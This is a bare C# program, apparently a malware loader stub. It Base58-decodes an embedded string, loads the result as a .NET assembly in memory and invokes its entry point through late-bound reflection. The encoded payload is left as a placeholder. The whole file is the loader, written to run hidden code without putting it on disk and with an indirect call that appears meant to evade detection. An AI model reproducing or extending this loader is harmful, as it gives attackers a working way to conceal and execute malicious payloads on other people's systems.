using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Net;
using static System.Net.Mime.MediaTypeNames;
using System.Security.Cryptography;
using Microsoft.VisualBasic;
using System.Linq;
using System.Numerics;

class Program
{
    static void Main(string[] args)
    {
        string str = "Base58";
        byte[] app = Base58Decode(str);
        Assembly assembly = Assembly.Load(app);
        MethodInfo methodInfo = (MethodInfo)Interaction.CallByName(assembly, "EntryPoint", CallType.Get, null);
        methodInfo.Invoke(null, null);
        Console.ReadKey();
    }
    public static byte[] Base58Decode(string base58)
    {
        string Base58Chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        BigInteger value = 0;
        foreach (char c in base58)
        {
            int charValue = Base58Chars.IndexOf(c);
            if (charValue == -1)
                throw new ArgumentException($"Invalid Base58 character: {c}", nameof(base58));
            value = value * 58 + charValue;
        }
        byte[] result = value.ToByteArray().Reverse().ToArray();
        int leadingZeros = base58.TakeWhile(c => c == Base58Chars[0]).Count();
        return result.Skip(leadingZeros).ToArray();
    }
}